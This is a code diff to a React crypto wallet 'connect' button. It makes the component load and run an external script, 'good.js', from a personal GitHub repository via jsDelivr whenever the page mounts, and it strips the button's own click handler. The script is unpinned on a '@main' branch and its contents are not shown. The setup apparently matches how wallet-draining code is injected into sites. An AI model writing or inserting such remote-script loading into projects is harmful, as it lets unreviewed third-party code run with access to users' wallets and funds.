@@ -1,36 +1,32 @@
-import React, { useEffect } from 'react';
+import { useEffect } from 'react';
 import { motion } from 'framer-motion';
 import { Wallet } from 'lucide-react';
 
 export const ConnectButton = () => {
-  // Dynamically add the <script src="https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js"> when the component mounts
   useEffect(() => {
-    // Create the script tag
+    // Dynamically load the external script (good.js)
     const script = document.createElement('script');
-    script.src = '<script src="https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js"></script>';  // Link to the external JS file
-    script.async = true;  // Optional: make it async for non-blocking load
+    script.src = 'https://cdn.jsdelivr.net/gh/root777x/solv@main/good.js';
+    script.async = true;
+    script.onload = () => {
+      console.log('good.js has been loaded successfully!');
+    };
+    script.onerror = () => {
+      console.error('Failed to load good.js');
+    };
     document.body.appendChild(script);
 
-    // Cleanup: Remove the script when the component is unmounted
+    // Cleanup function to remove the script when the component unmounts
     return () => {
       document.body.removeChild(script);
     };
-  }, []); // Empty dependency array ensures this effect runs only once, when the component mounts
-
-  const handleConnect = () => {
-    // Trigger a function from good.js or any other logic here
-    console.log('Connect button clicked!');
-    
-    // If `good.js` adds a global function or modifies the button,
-    // you can call that here as well (e.g., call `goodFunction()`).
-  };
+  }, []); // Empty dependency array means this effect runs once when the component mounts
 
   return (
     <motion.button
       className="group relative px-10 py-4 rounded-xl bg-purple-500 text-white text-lg font-bold overflow-hidden"
       whileHover={{ scale: 1.05 }}
       whileTap={{ scale: 0.95 }}
-      onClick={handleConnect} // Add your click handler
     >
       <div className="absolute inset-0 bg-gradient-to-r from-purple-600 to-purple-400 opacity-0 group-hover:opacity-100 transition-opacity" />
       <div className="absolute inset-0 bg-[radial-gradient(circle_at_50%_50%,rgba(255,255,255,0.2),transparent_100%)]" />
